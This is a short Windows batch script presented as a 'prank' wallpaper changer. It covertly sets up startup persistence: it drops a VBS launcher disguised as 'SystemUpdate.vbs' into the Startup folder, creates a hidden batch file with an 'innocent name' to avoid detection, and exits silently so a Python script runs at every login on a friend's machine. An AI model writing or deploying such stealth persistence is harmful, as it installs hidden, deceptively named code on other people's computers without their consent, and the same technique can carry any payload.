@echo off
REM Stealth Wallpaper Changer - Completely invisible installation
REM Perfect for harmless pranks on friends

REM Get current directory
set "SCRIPT_DIR=%~dp0"

REM Create hidden VBS script with random name to avoid detection
set "VBS_FILE=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.vbs"

REM Create invisible VBS script
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run chr(34^) ^& "%SCRIPT_DIR%WallpaperChanger_Stealth.bat" ^& chr(34^), 0, false
) > "%VBS_FILE%" 2>nul

REM Create the stealth batch file with innocent name
set "STEALTH_BAT=%SCRIPT_DIR%WallpaperChanger_Stealth.bat"
(
echo @echo off
echo REM System background task
echo timeout /t 3 /nobreak ^>nul
echo cd /d "%SCRIPT_DIR%"
echo if exist "instant_wallpaper.py" ^(
echo     python instant_wallpaper.py startup ^>nul 2^>^&1
echo ^)
) > "%STEALTH_BAT%" 2>nul

REM Make the stealth batch file hidden
attrib +h "%STEALTH_BAT%" 2>nul

REM Exit completely silently
exit /b 0
